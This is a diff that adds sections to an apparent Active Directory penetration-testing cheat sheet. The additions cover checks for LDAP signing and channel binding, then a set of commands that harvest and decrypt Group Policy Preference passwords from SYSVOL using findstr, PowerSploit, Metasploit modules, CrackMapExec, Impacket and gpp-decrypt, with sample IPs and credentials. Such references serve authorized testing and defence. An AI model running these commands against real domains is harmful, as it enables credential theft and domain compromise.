@@ -261,8 +261,17 @@ The LDAP relay attack will give you the ability to perform multiple action such 
 - In case the relayed session is from a *Domain Admins* user you will be able to directly persiste and create a new *Domain Admins* user.
 - 
 
+Validate LDAP signing is not enforced
+```
+crackmapexec ldap domain_controllers.txt -u jdoe -p Password123 -M ldap-signing
+```
+
 #### LDAP Channel Binding
 Channel binding is the act of binding the transport layer and application layer together. In the case of LDAP channel binding, the TLS tunnel and the LDAP application layer are being tied together. When these two layers are tied together it creates a unique fingerprint for the LDAP communication. Any interception of the LDAP communications cannot be re-used as this would require establishing a new TLS tunnel which would invalidate the LDAP communication’s unique fingerprint.
+
+```
+python3 LdapRelayScan.py -dc-ip 192.168.0.10 -u jdoe -p Password123
+```
 
 ### Unencrypted Protocols in use
 
@@ -281,7 +290,60 @@ Port 21
 ##### LDAP
 LDAPS uses its own distinct network port to connect clients and servers. The default port for LDAP is port 389, but LDAPS uses port 636 and establishes TLS/SSL upon connecting with a client.
 
-### GPP / GPO passwords
+### SYSVOL / GPP
+- https://adsecurity.org/?p=2288
+
+*From Windows client perspective*
+```
+findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
+```
+
+The PowerSploit function Get-GPPPassword is most useful for Group Policy Preference exploitation.  
+- ![Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)
+
+*From Linux client*  
+
+##### Metasploit Module
+```
+use auxiliary/scanner/smb/smb_enum_gpp
+msf auxiliary(smb_enum_gpp) > set rhosts 192.168.1.103
+msf auxiliary(smb_enum_gpp) > set smbuser raj
+msf auxiliary(smb_enum_gpp) > set smbpass Ignite@123
+msf auxiliary(smb_enum_gpp) > exploit
+```
+
+##### Metasploit Post-Module : Once you get shell on windows host
+```
+use post/windows/gather/credentials/gpp
+msf post(windows/gather/credentials/gpp) > set session 1
+msf post(windows/gather/credentials/gpp) > exploit
+```
+
+##### CrackMapExec Module 1 : gpp_password
+Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
+Groups.xml, Services.xml, Scheduledtasks.xml, DataSources.xml, Printers.xml, Drives.xml
+```
+crackmapexec smb 192.168.0.10 -u jdoe -p Password 123 -M gpp_pasword
+```
+
+##### CrackMapExec Module 2: gpp_autologin
+Searches the domain controller for registry.xml to find autologon information and returns the username and password.
+```
+crackmapexec smb 192.168.0.10 -u jdoe -p Password 123 -M gpp_autologin
+```
+
+##### Impacket Module
+Breadth-first search algorithm to recursively find .xml extension files within SYSVOL.
+```
+Get-GPPPassword.py company.local/jdoe:Password123@192.168.0.10'
+```
+
+##### Decrypt the found password manually
+```
+gpp-decrypt <encrypted cpassword>
+```
+
+
 
 ### LLMNR / NBT-NS / mDNS
 > Microsoft systems use Link-Local Multicast Name Resolution (LLMNR) and the NetBIOS Name Service (NBT-NS) for local host resolution when DNS lookups fail. Apple Bonjour and Linux zero-configuration implementations use Multicast DNS (mDNS) to discover systems within a network.
